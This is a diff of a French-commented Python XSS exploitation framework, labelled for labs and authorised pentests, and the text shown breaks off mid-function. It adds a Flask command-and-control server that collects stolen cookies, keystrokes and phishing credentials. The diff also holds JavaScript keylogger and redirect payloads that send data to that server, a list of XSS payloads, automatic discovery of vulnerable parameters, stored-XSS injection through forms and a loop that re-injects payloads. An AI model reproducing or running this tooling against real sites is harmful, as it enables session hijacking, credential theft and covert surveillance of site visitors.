@@ -2,10 +2,16 @@
 # -*- coding: utf-8 -*-
 """
 ╔══════════════════════════════════════════════════════════════════╗
-║  XSS FRAMEWORK ULTIME - PERSISTANCE EDITION v1.1                 ║
+║  XSS FRAMEWORK ULTIME v2.0                                       ║
 ║  Auteur : Jathniel                                               ║
 ║  Framework d'exploitation XSS pour labo/CTF/pentest autorisé     ║
 ║  Kali Linux (WSL) / Ubuntu — Python 3.12                         ║
+║                                                                  ║
+║  NOUVEAU v2.0 :                                                  ║
+║  - Auto-détection des paramètres vulnérables                     ║
+║  - Correction des simulations                                    ║
+║  - Support HTTPS avec vérification                               ║
+║  - Menu plus clair avec exemples                                 ║
 ╚══════════════════════════════════════════════════════════════════╝
 """
 
@@ -13,23 +19,29 @@ import os
 import sys
 import time
 import json
-import uuid
 import sqlite3
 import hashlib
 import threading
 import re
 import socket
 import random
+import ssl
+import warnings
 from datetime import datetime, timezone
-from urllib.parse import urljoin, urlparse, parse_qs, quote
+from urllib.parse import urljoin, urlparse, parse_qs, quote, urlencode
 
 import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
 from rich.console import Console
 from rich.table import Table
 from rich.panel import Panel
 from rich.prompt import Prompt
 from rich import box
 from flask import Flask, request, jsonify, Response, send_from_directory
+
+# Désactiver les warnings SSL
+warnings.simplefilter('ignore', InsecureRequestWarning)
 
 # ═════════════════════════════════════════════════════════════════════
 # CONFIGURATION GLOBALE
@@ -44,35 +56,64 @@ os.makedirs(C2_DIR, exist_ok=True)
 C2_HOST = "0.0.0.0"
 C2_PORT = 8080
 
-TIMEOUT_HTTP = 10
+TIMEOUT_HTTP = 15
 USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
+
+# Vérification SSL désactivée par défaut (pour labo)
+VERIFY_SSL = False
 
 
 def get_local_ip():
     """
-    Détecte automatiquement l'IP locale de la machine (WSL, Ubuntu, LAN).
-    Technique : ouvrir une socket UDP vers une IP externe (aucun paquet envoyé)
-    pour connaître l'interface réseau utilisée. Fallback sur 127.0.0.1.
+    Détecte l'IP locale de la machine (WSL, Ubuntu, LAN).
+    Retourne la première IP non-loopback trouvée.
     """
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    ips = []
+    
+    # Méthode 1 : UDP vers DNS public
     try:
-        # Ne se connecte pas réellement — détermine juste l'interface de sortie
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(2)
         s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-    except OSError:
-        try:
-            # Fallback : résolution du hostname
-            ip = socket.gethostbyname(socket.gethostname())
-        except OSError:
-            ip = "127.0.0.1"
-    finally:
+        ips.append(s.getsockname()[0])
         s.close()
-    return ip
+    except (OSError, socket.timeout):
+        pass
+    
+    # Méthode 2 : hostname
+    try:
+        ips.append(socket.gethostbyname(socket.gethostname()))
+    except OSError:
+        pass
+    
+    # Méthode 3 : interfaces réseau (Linux)
+    try:
+        import fcntl
+        import struct
+        for ifname in ['eth0', 'wlan0', 'en0', 'wlp2s0', 'ens33']:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                ip = socket.inet_ntoa(fcntl.ioctl(
+                    s.fileno(), 0x8915, struct.pack('256s', ifname[:15].encode())
+                )[20:24])
+                ips.append(ip)
+                s.close()
+            except OSError:
+                pass
+    except ImportError:
+        pass
+    
+    # Prioriser les IPs LAN
+    for ip in ips:
+        if ip.startswith(('192.168.', '10.', '172.')) and not ip.startswith('172.17.'):
+            return ip
+    
+    return ips[0] if ips else "127.0.0.1"
 
 
-# IP détectée automatiquement au démarrage — le C2 utilise cette IP
-# pour que les victimes (même VM/machine distincte) puissent joindre le C2.
+# IP détectée automatiquement
 C2_PUBLIC = f"http://{get_local_ip()}:{C2_PORT}"
+
 
 # ═════════════════════════════════════════════════════════════════════
 # BASE DE DONNÉES SQLITE
@@ -82,6 +123,8 @@ def db_init():
     """Initialise la base de données SQLite"""
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
+    c.execute("PRAGMA journal_mode=WAL")
+    c.execute("PRAGMA synchronous=NORMAL")
     c.execute("""CREATE TABLE IF NOT EXISTS captures (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         type TEXT NOT NULL,
@@ -125,7 +168,6 @@ def db_init():
 
 
 def db_insert_capture(cap_type, victim_ip, victim_ua, url, data, raw=""):
-    """Insère une capture en base"""
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute("INSERT INTO captures (type,victim_ip,victim_ua,url,data,raw,timestamp) VALUES (?,?,?,?,?,?,?)",
@@ -137,7 +179,6 @@ def db_insert_capture(cap_type, victim_ip, victim_ua, url, data, raw=""):
 
 
 def db_increment_execution(injection_db_id):
-    """Incrémente le compteur d'exécution d'une injection"""
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute("UPDATE injections SET executions = executions + 1, last_seen = ? WHERE id = ?",
@@ -155,7 +196,6 @@ app.config["SECRET_KEY"] = hashlib.sha256(os.urandom(32)).hexdigest()
 
 
 def _get_request_data():
-    """Unifie la lecture des données POST (JSON ou form) ou GET (query)"""
     if request.method == "POST":
         return request.get_json(silent=True) or dict(request.form)
     return dict(request.args)
@@ -163,7 +203,6 @@ def _get_request_data():
 
 @app.route("/collect/cookies", methods=["POST", "GET"])
 def collect_cookies():
-    """Endpoint de collecte de cookies volés"""
     data = _get_request_data()
     cookies_raw = data.get("cookies", "")
     url = data.get("url", "unknown")
@@ -175,7 +214,6 @@ def collect_cookies():
 
 @app.route("/collect/keys", methods=["POST", "GET"])
 def collect_keys():
-    """Endpoint de collecte de frappes clavier"""
     data = _get_request_data()
     keys = data.get("keys", "")
     url = data.get("url", "unknown")
@@ -187,7 +225,6 @@ def collect_keys():
 
 @app.route("/collect/phish", methods=["POST", "GET"])
 def collect_phish():
-    """Endpoint de collecte d'identifiants phishing"""
     data = _get_request_data()
     db_insert_capture("phishing", request.remote_addr, request.headers.get("User-Agent", ""),
                       data.get("url", "unknown"), data)
@@ -197,7 +234,6 @@ def collect_phish():
 
 @app.route("/collect/beacon", methods=["POST", "GET"])
 def collect_beacon():
-    """Endpoint beacon — la victime signale sa présence"""
     data = _get_request_data()
     db_insert_capture("beacon", request.remote_addr, request.headers.get("User-Agent", ""),
                       data.get("url", "unknown"), data)
@@ -212,7 +248,6 @@ def collect_beacon():
 
 @app.route("/collect/screen", methods=["POST", "GET"])
 def collect_screen():
-    """Endpoint de collecte d'infos navigateur / fichiers fetchés"""
     data = _get_request_data()
     db_insert_capture("beacon_info", request.remote_addr, request.headers.get("User-Agent", ""),
                       data.get("url", "unknown"), data)
@@ -224,7 +259,6 @@ def collect_screen():
 
 @app.route("/payload/<injection_id>", methods=["GET"])
 def serve_payload(injection_id):
-    """Sert le payload JS pour une injection donnée"""
     payload_type = request.args.get("t", "beacon")
     extra = request.args.get("extra", "")
     js = build_js_payload(payload_type, injection_id, extra)
@@ -233,7 +267,6 @@ def serve_payload(injection_id):
 
 @app.route("/download/<filename>", methods=["GET"])
 def serve_download(filename):
-    """Sert un fichier à télécharger par la victime"""
     safe = os.path.basename(filename)
     if os.path.isfile(os.path.join(C2_DIR, safe)):
         return send_from_directory(C2_DIR, safe, as_attachment=True)
@@ -241,7 +274,6 @@ def serve_download(filename):
 
 
 def run_c2_server():
-    """Lance le serveur Flask en arrière-plan"""
     app.run(host=C2_HOST, port=C2_PORT, debug=False, use_reloader=False, threaded=True)
 
 
@@ -290,15 +322,27 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
         return f"""
 (function() {{
   var buf = '';
-  var timer = null;
-  document.addEventListener('keypress', function(e) {{
-    buf += String.fromCharCode(e.which || e.keyCode);
-    if (timer) clearTimeout(timer);
-    timer = setTimeout(flush, 3000);
-  }});
+  var lastInput = '';
   document.addEventListener('keydown', function(e) {{
-    if (e.key === 'Enter') buf += '\\n';
-    if (e.key === 'Backspace') buf = buf.slice(0, -1);
+    var key = e.key;
+    if (key === 'Enter') buf += '\\n';
+    else if (key === 'Backspace') buf = buf.slice(0, -1);
+    else if (key === 'Tab') buf += '\\t';
+    else if (key.length === 1) buf += key;
+    else if (e.ctrlKey || e.altKey || e.metaKey) {{
+      buf += '[' + (e.ctrlKey?'C':'') + (e.altKey?'A':'') + (e.metaKey?'M':'') + '+' + key + ']';
+    }}
+  }});
+  document.addEventListener('input', function(e) {{
+    var val = e.target.value;
+    if (val !== lastInput) {{
+      var diff = val.replace(lastInput, '');
+      if (diff) buf += '[INPUT:' + diff + ']';
+      lastInput = val;
+    }}
+  }});
+  document.addEventListener('focusin', function(e) {{
+    if (e.target.name) buf += '[FOCUS:' + e.target.name + ']';
   }});
   function flush() {{
     if (buf.length === 0) return;
@@ -309,7 +353,7 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
     }}).catch(function(){{}});
     buf = '';
   }}
-  setInterval(flush, 15000);
+  setInterval(flush, 10000);
 }})();
 """
 
@@ -366,7 +410,7 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
   fetch('{c2}/collect/beacon', {{
     method: 'POST',
     headers: {{'Content-Type': 'application/json'}},
-    body: JSON.stringify({{inj_id: '{inj_id}', url: location.href, action: 'redirect_to_{target}'}})
+    body: JSON.stringify({{inj_id: '{inj_id}', url: location.href, action: 'redirect'}})
   }}).catch(function(){{}});
   setTimeout(function() {{ window.location.href = '{target}'; }}, 1500);
 }})();
@@ -486,58 +530,35 @@ XSS_PAYLOADS = [
     "<script>alert(1)</script>",
     "<script>alert('XSS')</script>",
     "<script>confirm(1)</script>",
-    "<script>prompt(1)</script>",
     "<script>alert(document.cookie)</script>",
     "<ScRiPt>alert(1)</ScRiPt>",
     "<img src=x onerror=alert(1)>",
     "<img src=x onerror=alert(document.cookie)>",
-    "<img src=x onerror=confirm(1)>",
-    "<img/src=x/onerror=alert(1)>",
-    "<img src='x' onmouseover='alert(1)'>",
     "<svg onload=alert(1)>",
     "<svg/onload=alert(1)>",
-    "<svg><script>alert(1)</script></svg>",
-    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
     "<iframe src=javascript:alert(1)>",
-    "<iframe srcdoc='<script>alert(1)</script>'>",
     "<body onload=alert(1)>",
-    "<body onpageshow=alert(1)>",
     "<div onmouseover=alert(1)>hover</div>",
     "<input onfocus=alert(1) autofocus>",
-    "<form><button formaction=javascript:alert(1)>click",
     "<video><source onerror=alert(1)>",
-    "<audio src=x onerror=alert(1)>",
-    "<marquee onstart=alert(1)>XSS</marquee>",
     "<details open ontoggle=alert(1)>",
-    "<select onfocus=alert(1) autofocus>",
-    "<textarea onfocus=alert(1) autofocus>",
-    "<keygen autofocus onfocus=alert(1)>",
-    "%3Cscript%3Ealert(1)%3C/script%3E",
-    "&#60;script&#62;alert(1)&#60;/script&#62;",
     "javascript:alert(1)",
     "JaVaScRiPt:alert(1)",
     "data:text/html,<script>alert(1)</script>",
-    "onerror=alert(1)//",
     "'onmouseover='alert(1)'",
     "\"onfocus=\"alert(1)\" autofocus\"",
-    "{{7*7}}",
-    "${7*7}",
     "<object data=javascript:alert(1)>",
     "<embed src=javascript:alert(1)>",
     "<a href=javascript:alert(1)>click</a>",
     "<a href='javascript:alert(document.cookie)'>click</a>",
-    "<base href=javascript:alert(1)//>",
     "<math><mtext><table><mglyph><style><!--</style><img title=--></mglyph><img src=1 onerror=alert(1)>",
 ]
 
 
 def parse_cookie_header(cookie_str):
-    """
-    Parse un header Cookie au format navigateur/curl :
-    'PHPSESSID=abc; security=low'  ->  dict
-    """
+    """Parse un header Cookie : 'a=b; c=d' -> {'a':'b', 'c':'d'}"""
     cookies = {}
-    cookie_str = cookie_str.strip()
+    cookie_str = (cookie_str or '').strip()
     if not cookie_str:
         return cookies
     for pair in cookie_str.split(";"):
@@ -557,127 +578,6 @@ def build_session(cookies_str=None, headers=None):
     if cookies_str:
         session.cookies.update(parse_cookie_header(cookies_str))
     return session
-
-
-def scan_reflected(url, method="GET", params=None, cookies_str=None):
-    """Scanne une URL pour détecter des XSS réfléchis"""
-    results = []
-    session = build_session(cookies_str)
-
-    if params is None:
-        parsed = urlparse(url)
-        qs = parse_qs(parsed.query)
-        params = {k: v[0] for k, v in qs.items()}
-        url = url.split("?")[0]
-
-    if not params:
-        params = {"q": "", "search": "", "id": "", "name": "", "input": "", "page": "",
-                  "query": "", "keyword": "", "msg": "", "comment": "", "user": ""}
-
-    # Référence sans payload (pour baseline)
-    try:
-        if method.upper() == "GET":
-            session.get(url, params=params, timeout=TIMEOUT_HTTP, allow_redirects=True)
-        else:
-            session.post(url, data=params, timeout=TIMEOUT_HTTP, allow_redirects=True)
-    except requests.RequestException as e:
-        CONSOLE.print(f"[red]Erreur connexion : {e}[/red]")
-        return results
-
-    for param_name in params:
-        for payload in XSS_PAYLOADS:
-            marker = f"xssmark{random.randint(1000,9999)}"
-            test_payload = payload.replace("alert(1)", f"alert('{marker}')")
-            test_payload = test_payload.replace("alert('XSS')", f"alert('{marker}')")
-            test_params = dict(params)
-            test_params[param_name] = test_payload
-
-            try:
-                if method.upper() == "GET":
-                    resp = session.get(url, params=test_params, timeout=TIMEOUT_HTTP, allow_redirects=True)
-                else:
-                    resp = session.post(url, data=test_params, timeout=TIMEOUT_HTTP, allow_redirects=True)
-            except requests.RequestException:
-                continue
-
-            body = resp.text
-
-            if test_payload in body:
-                results.append({
-                    "param": param_name,
-                    "payload": payload,
-                    "method": method.upper(),
-                    "evidence": "réflexion exacte",
-                    "url": url,
-                    "status_code": resp.status_code,
-                })
-            elif marker in body:
-                if re.search(rf'<script[^>]*>[^<]*{marker}', body, re.IGNORECASE) or \
-                   re.search(rf'on\w+\s*=\s*["\']?[^"\']*{marker}', body, re.IGNORECASE):
-                    results.append({
-                        "param": param_name,
-                        "payload": payload,
-                        "method": method.upper(),
-                        "evidence": "réflexion dans contexte exécutable",
-                        "url": url,
-                        "status_code": resp.status_code,
-                    })
-
-            time.sleep(0.05)
-
-    return results
-
-
-def scan_stored(url, forms, cookies_str=None):
-    """
-    Scanne pour XSS stocké : injecte un marqueur via les formulaires,
-    puis vérifie s'il persiste en rechargeant la page.
-    """
-    results = []
-    session = build_session(cookies_str)
-
-    marker = f"xssstored{random.randint(10000,99999)}"
-    test_payload = f"<script>alert('{marker}')</script>"
-
-    for form_info in forms:
-        inject_data = {}
-        for field in form_info.get("fields", []):
-            if field.get("type") in ("text", "textarea", "hidden", "search", "url", "email"):
-                inject_data[field["name"]] = test_payload
-            elif field.get("type") == "submit":
-                inject_data[field["name"]] = field.get("value", "submit")
-        if not inject_data:
-            continue
-        try:
-            resp = session.post(form_info["action"], data=inject_data, timeout=TIMEOUT_HTTP, allow_redirects=True)
-            if marker in resp.text:
-                results.append({
-                    "param": str(list(inject_data.keys())),
-                    "payload": test_payload,
-                    "method": "POST(form)",
-                    "evidence": "réflexion après POST formulaire",
-                    "url": form_info["action"],
-                    "status_code": resp.status_code,
-                })
-        except requests.RequestException as e:
-            CONSOLE.print(f"[yellow]Erreur formulaire {form_info['action']}: {e}[/yellow]")
-
-    # Vérifie la persistance : recharge la page et cherche le marqueur
-    try:
-        resp = session.get(url, timeout=TIMEOUT_HTTP)
-        if marker in resp.text:
-            results.append({
-                "param": "page",
-                "payload": test_payload,
-                "method": "GET",
-                "evidence": "payload persistant détecté (XSS stocké confirmé)",
-                "url": url,
-                "status_code": resp.status_code,
-            })
-    except requests.RequestException:
-        pass
-
-    return results
 
 
 def extract_forms(url, html):
@@ -715,41 +615,221 @@ def extract_forms(url, html):
     return forms
 
 
+def detect_all_params(url, cookies_str=None):
+    """Détecte tous les paramètres injectables d'une page"""
+    session = build_session(cookies_str)
+    params_found = []
+    
+    try:
+        resp = session.get(url, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
+        html = resp.text
+    except requests.RequestException as e:
+        CONSOLE.print(f"[red]Impossible de joindre {url} : {e}[/red]")
+        return []
+    
+    # 1. Paramètres URL existants
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query)
+    for param_name, values in qs.items():
+        params_found.append({
+            'name': param_name,
+            'value': values[0] if values else '',
+            'source': 'url',
+            'method': 'GET',
+            'action': url.split('?')[0],
+            'type': 'url_param',
+        })
+    
+    # 2. Champs de formulaire
+    forms = extract_forms(url, html)
+    for form in forms:
+        for field in form['fields']:
+            if field.get('type') in ('submit', 'button', 'reset', 'image'):
+                continue
+            params_found.append({
+                'name': field['name'],
+                'value': field.get('value', ''),
+                'source': 'form',
+                'method': form['method'],
+                'action': form['action'],
+                'type': field.get('type', 'text'),
+                'form_fields': [f['name'] for f in form['fields']],
+            })
+    
+    # 3. Si rien, tester les paramètres communs
+    if not params_found:
+        common_params = ['q', 'search', 'id', 'name', 'query', 'keyword',
+                         'user', 'username', 'email', 'page', 'input', 'msg',
+                         'comment', 'text', 'url', 'redirect', 'next', 'file']
+        for cp in common_params:
+            params_found.append({
+                'name': cp,
+                'value': '',
+                'source': 'common',
+                'method': 'GET',
+                'action': url.split('?')[0],
+                'type': 'common',
+            })
+    
+    return params_found
+
+
+def test_param_xss(param_info, url, cookies_str=None):
+    """Teste UN paramètre pour XSS réfléchi"""
+    session = build_session(cookies_str)
+    marker = f"xssmark{random.randint(100000, 999999)}"
+    payload = f"<script>alert('{marker}')</script>"
+    
+    try:
+        if param_info['source'] == 'url':
+            parsed = urlparse(url)
+            qs = parse_qs(parsed.query, keep_blank_values=True)
+            qs[param_info['name']] = [payload]
+            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(qs, doseq=True)}"
+            resp = session.get(test_url, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL, allow_redirects=True)
+        
+        elif param_info['source'] == 'form':
+            data = {}
+            for field_name in param_info.get('form_fields', []):
+                if field_name == param_info['name']:
+                    data[field_name] = payload
+                else:
+                    data[field_name] = 'test'
+            
+            if param_info['method'].upper() == 'POST':
+                resp = session.post(param_info['action'], data=data,
+                                    timeout=TIMEOUT_HTTP, verify=VERIFY_SSL, allow_redirects=True)
+            else:
+                resp = session.get(param_info['action'], params=data,
+                                   timeout=TIMEOUT_HTTP, verify=VERIFY_SSL, allow_redirects=True)
+        
+        else:
+            resp = session.get(param_info['action'],
+                               params={param_info['name']: payload},
+                               timeout=TIMEOUT_HTTP, verify=VERIFY_SSL, allow_redirects=True)
+    except requests.RequestException:
+        return False
+    
+    body = resp.text
+    if payload in body:
+        return True
+    if marker in body and ('<script' in body or 'alert' in body):
+        return True
+    return False
+
+
+def auto_detect_vulnerable(url, cookies_str=None):
+    """Détecte AUTOMATIQUEMENT les paramètres vulnérables"""
+    CONSOLE.print("\n[bold cyan]═══ AUTO-DÉTECTION DES PARAMÈTRES ═══[/bold cyan]\n")
+    
+    CONSOLE.print("[yellow]Étape 1/2 : Détection des paramètres...[/yellow]")
+    params = detect_all_params(url, cookies_str)
+    
+    if not params:
+        CONSOLE.print("[red]Aucun paramètre détecté.[/red]")
+        return []
+    
+    table = Table(title="Paramètres détectés", box=box.ROUNDED)
+    table.add_column("#", style="dim")
+    table.add_column("Nom", style="cyan")
+    table.add_column("Source", style="yellow")
+    table.add_column("Méthode", style="magenta")
+    table.add_column("Type", style="green")
+    
+    for i, p in enumerate(params):
+        table.add_row(str(i), p['name'], p['source'], p['method'], p['type'])
+    
+    CONSOLE.print(table)
+    CONSOLE.print(f"\n[yellow]Étape 2/2 : Test de {len(params)} paramètre(s)...[/yellow]\n")
+    
+    vulnerable = []
+    for i, p in enumerate(params):
+        CONSOLE.print(f"[dim]Test {i+1}/{len(params)} : {p['name']}...[/dim]", end=" ")
+        
+        if test_param_xss(p, url, cookies_str):
+            vulnerable.append(p)
+            CONSOLE.print("[bold red]VULNÉRABLE[/bold red]")
+        else:
+            CONSOLE.print("[dim]OK[/dim]")
+        
+        time.sleep(0.1)
+    
+    CONSOLE.print()
+    if vulnerable:
+        table = Table(title="Paramètres VULNÉRABLES", box=box.ROUNDED, border_style="red")
+        table.add_column("#", style="dim")
+        table.add_column("Nom", style="bold red")
+        table.add_column("Source", style="yellow")
+        table.add_column("Méthode", style="magenta")
+        
+        for i, p in enumerate(vulnerable):
+            table.add_row(str(i), p['name'], p['source'], p['method'])
+        
+        CONSOLE.print(table)
+    else:
+        CONSOLE.print("[yellow]Aucun paramètre vulnérable détecté.[/yellow]")
+    
+    return vulnerable
+
+
+def ask_param_auto(url, cookies_str=None):
+    """Demande le paramètre avec option auto-détection"""
+    CONSOLE.print("\n[bold cyan]Choix du paramètre :[/bold cyan]")
+    CONSOLE.print("  [1] Saisir manuellement")
+    CONSOLE.print("  [2] Auto-détecter les paramètres vulnérables")
+    CONSOLE.print("  [0] Annuler\n")
+    
+    choice = Prompt.ask("[yellow]Choix[/yellow]", default="2")
+    
+    if choice == "0":
+        return None
+    
+    if choice == "1":
+        param = Prompt.ask("[cyan]Nom du paramètre[/cyan]", default="name")
+        method = Prompt.ask("[cyan]Méthode[/cyan]", choices=["GET", "POST"], default="GET")
+        return {
+            'name': param,
+            'method': method,
+            'action': url.split('?')[0],
+            'source': 'manual',
+        }
+    
+    if choice == "2":
+        vulnerable = auto_detect_vulnerable(url, cookies_str)
+        
+        if not vulnerable:
+            CONSOLE.print("[red]Aucun paramètre vulnérable. Essaie la saisie manuelle.[/red]")
+            return None
+        
+        if len(vulnerable) == 1:
+            p = vulnerable[0]
+            CONSOLE.print(f"\n[green]Utilisation automatique de : {p['name']}[/green]")
+            return p
+        
+        CONSOLE.print(f"\n[bold cyan]{len(vulnerable)} paramètre(s) vulnérable(s). Lequel utiliser ?[/bold cyan]")
+        for i, p in enumerate(vulnerable):
+            CONSOLE.print(f"  [{i}] {p['name']} ({p['source']}, {p['method']})")
+        
+        idx = Prompt.ask("[yellow]Index[/yellow]", default="0")
+        try:
+            return vulnerable[int(idx)]
+        except (ValueError, IndexError):
+            return vulnerable[0]
+    
+    return None
+
+
 # ═════════════════════════════════════════════════════════════════════
-# MODULE EXPLOITATION
+# MODULE EXPLOITATION (CORRIGÉ)
 # ═════════════════════════════════════════════════════════════════════
 
 def exploit_inject(url, param, method, payload_type, extra="", cookies_str=None):
     """
-    Injecte un payload d'exploitation dans un paramètre vulnérable.
-    Le payload est un <script src> pointant vers le C2 : la victime qui
-    charge la page exécute le module choisi. Retourne (id_bdd, script_tag).
+    CORRIGÉ : Crée l'injection EN PREMIER en DB, puis utilise l'ID réel.
     """
     session = build_session(cookies_str)
 
-    js_payload = build_js_payload(payload_type, "0", extra)
-    script_tag = f"<script src='{C2_PUBLIC}/payload/{{INJ}}?t={payload_type}'></script>"
-
-    parsed = urlparse(url)
-    qs = parse_qs(parsed.query)
-    clean_url = url.split("?")[0]
-
-    if method.upper() == "GET":
-        test_params = {k: v[0] for k, v in qs.items()} if qs else {}
-        test_params[param] = script_tag.replace("{INJ}", "probe")
-        try:
-            session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP)
-        except requests.RequestException:
-            pass
-    else:
-        test_data = {k: v[0] for k, v in qs.items()} if qs else {}
-        test_data[param] = script_tag.replace("{INJ}", "probe")
-        try:
-            session.post(url, data=test_data, timeout=TIMEOUT_HTTP)
-        except requests.RequestException:
-            pass
-
-    # Enregistre l'injection en base
+    # 1. Créer l'injection en DB AVANT l'injection réelle
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute("""INSERT INTO injections (url, param, payload, method, type, status, created_at)
@@ -760,61 +840,42 @@ def exploit_inject(url, param, method, payload_type, extra="", cookies_str=None)
     conn.commit()
     conn.close()
 
-    # Le script_tag réel utilise l'ID de base de données
-    # pour que le beacon incrémentale le compteur d'exécutions
-    final_tag = script_tag.replace("{INJ}", str(injection_db_id))
-    return injection_db_id, final_tag
+    # 2. Construire le script tag avec l'ID réel
+    script_tag = f"<script src='{C2_PUBLIC}/payload/{injection_db_id}?t={payload_type}'></script>"
+
+    # 3. Injecter le payload
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query)
+    clean_url = url.split("?")[0]
+
+    if method.upper() == "GET":
+        test_params = {k: v[0] for k, v in qs.items()} if qs else {}
+        test_params[param] = script_tag
+        try:
+            session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
+        except requests.RequestException:
+            pass
+    else:
+        test_data = {k: v[0] for k, v in qs.items()} if qs else {}
+        test_data[param] = script_tag
+        try:
+            session.post(url, data=test_data, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
+        except requests.RequestException:
+            pass
+
+    return injection_db_id, script_tag
 
 
 def exploit_stored(url, forms, payload_type, extra="", cookies_str=None):
-    """
-    Injecte un payload XSS stocké via les formulaires d'une page.
-    Le payload persiste en base de données côté cible et s'exécute
-    pour tout visiteur de la page.
-    """
+    """Injecte un payload XSS stocké via les formulaires"""
     session = build_session(cookies_str)
 
-    # Placeholder remplacé après insertion en base
     script_template = f"<script src='{C2_PUBLIC}/payload/{{INJ}}?t={payload_type}'"
     if extra:
         script_template += f"&extra={quote(extra)}"
     script_template += "></script>"
 
-    # Injecte d'abord avec un ID temporaire pour connaître les formulaires qui passent
-    probe_tag = script_template.replace("{INJ}", "probe")
-    working_forms = []
-    results = []
-
-    for form_info in forms:
-        inject_data = {}
-        for field in form_info.get("fields", []):
-            if field.get("type") in ("text", "textarea", "hidden", "search", "url", "email"):
-                inject_data[field["name"]] = probe_tag
-            elif field.get("type") == "submit":
-                inject_data[field["name"]] = field.get("value", "submit")
-
-        if not inject_data:
-            continue
-
-        try:
-            resp = session.post(form_info["action"], data=inject_data,
-                                timeout=TIMEOUT_HTTP, allow_redirects=True)
-            if probe_tag in resp.text:
-                working_forms.append((form_info, "injected + reflected"))
-                continue
-            # Vérifie si le payload persiste en base côté cible
-            check = session.get(url, timeout=TIMEOUT_HTTP)
-            if probe_tag in check.text:
-                working_forms.append((form_info, "injected + STORED (persistant)"))
-            else:
-                results.append({"form": form_info["action"], "status": "injecté mais non persistant/réfléchi"})
-        except requests.RequestException as e:
-            results.append({"form": form_info["action"], "status": f"erreur: {e}"})
-
-    if not working_forms:
-        return None, results
-
-    # Enregistre en base puis réinjecte avec le vrai ID dans les formulaires fonctionnels
+    # Créer l'injection en DB AVANT
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute("""INSERT INTO injections (url, param, payload, method, type, status, created_at)
@@ -826,38 +887,51 @@ def exploit_stored(url, forms, payload_type, extra="", cookies_str=None):
     conn.close()
 
     final_tag = script_template.replace("{INJ}", str(injection_db_id))
-    for form_info, _ in working_forms:
+
+    results = []
+    for form_info in forms:
         inject_data = {}
         for field in form_info.get("fields", []):
             if field.get("type") in ("text", "textarea", "hidden", "search", "url", "email"):
                 inject_data[field["name"]] = final_tag
             elif field.get("type") == "submit":
                 inject_data[field["name"]] = field.get("value", "submit")
-        try:
-            session.post(form_info["action"], data=inject_data, timeout=TIMEOUT_HTTP, allow_redirects=True)
-        except requests.RequestException:
-            pass
+            elif field.get("type") == "email":
+                inject_data[field["name"]] = "test@test.com"
 
-    for form_info, status in working_forms:
-        results.append({"form": form_info["action"], "status": f"{status} (ID {injection_db_id})"})
+        if not inject_data:
+            continue
+
+        try:
+            resp = session.post(form_info["action"], data=inject_data,
+                                timeout=TIMEOUT_HTTP, verify=VERIFY_SSL, allow_redirects=True)
+            if final_tag in resp.text:
+                results.append({"form": form_info["action"], "status": "injecté + reflété"})
+            else:
+                check = session.get(url, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
+                if final_tag in check.text:
+                    results.append({"form": form_info["action"], "status": "injecté + PERSISTANT"})
+                else:
+                    results.append({"form": form_info["action"], "status": "injecté (non vérifié)"})
+        except requests.RequestException as e:
+            results.append({"form": form_info["action"], "status": f"erreur: {e}"})
 
     return injection_db_id, results
 
 
 # ═════════════════════════════════════════════════════════════════════
-# MODULE PERSISTANCE
+# MODULE PERSISTANCE (CORRIGÉ)
 # ═════════════════════════════════════════════════════════════════════
 
 class PersistenceManager:
-    """Gère la persistance des injections XSS (réinjection auto)"""
+    """Gère la persistance des injections XSS"""
 
     def __init__(self):
         self.running = False
         self.thread = None
-        self.interval = 60  # secondes
+        self.interval = 60
 
     def start(self):
-        """Démarre la surveillance de persistance"""
         if self.running:
             CONSOLE.print("[yellow]La persistance est déjà active.[/yellow]")
             return
@@ -867,9 +941,7 @@ class PersistenceManager:
         CONSOLE.print(f"[green]Persistance activée — vérification toutes les {self.interval}s[/green]")
 
     def stop(self):
-        """Arrête la surveillance"""
         if not self.running:
-            CONSOLE.print("[yellow]La persistance n'est pas active.[/yellow]")
             return
         self.running = False
         if self.thread:
@@ -877,7 +949,6 @@ class PersistenceManager:
         CONSOLE.print("[red]Persistance désactivée.[/red]")
 
     def _monitor_loop(self):
-        """Boucle de vérification et réinjection"""
         while self.running:
             try:
                 self._check_and_reinject()
@@ -886,10 +957,11 @@ class PersistenceManager:
             time.sleep(self.interval)
 
     def _check_and_reinject(self):
-        """Vérifie si les injections actives sont toujours présentes, réinjecte sinon"""
+        """CORRIGÉ : Utilise un marqueur unique par injection"""
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
-        c.execute("SELECT id, url, param, payload, method FROM injections WHERE status = 'active'")
+        c.execute("""SELECT id, url, param, payload, method, type FROM injections
+                     WHERE status = 'active'""")
         active_injections = c.fetchall()
         conn.close()
 
@@ -897,28 +969,30 @@ class PersistenceManager:
         session.headers.update({"User-Agent": USER_AGENT})
 
         for inj in active_injections:
-            inj_db_id, url, param, payload_type, method = inj
+            inj_db_id, url, param, payload_type, method, inj_type = inj
             try:
-                resp = session.get(url.split("?")[0], timeout=TIMEOUT_HTTP)
